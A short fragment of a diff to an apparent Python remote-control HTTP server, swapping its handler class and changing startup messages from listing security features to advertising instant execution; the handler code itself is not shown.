         port = int(os.environ.get('PORT', 8080))
-        server = ThreadedHTTPServer(('0.0.0.0', port), EnhancedRemoteControlHandler)
-        print(f"Server started successfully on port {port}! Press Ctrl+C to stop.")
-        print("Security Features: IP Blocking, Rate Limiting, Two-Factor Auth, Password Change")
+        server = ThreadedHTTPServer(('0.0.0.0', port), InstantRemoteControlHandler)
+        print(f"🚀 Server started INSTANTLY on port {port}! Press Ctrl+C to stop.")
+        print("⚡ Features: Instant Execution, 0ms Delay, Real-time Responses")
         server.serve_forever()
     except KeyboardInterrupt:
         print("Server stopped by user")
@@ -2023,4 +2025,4 @@ def main():
             handler.conn.close()
 
 if __name__ == "__main__":
-    main()    
+    main()
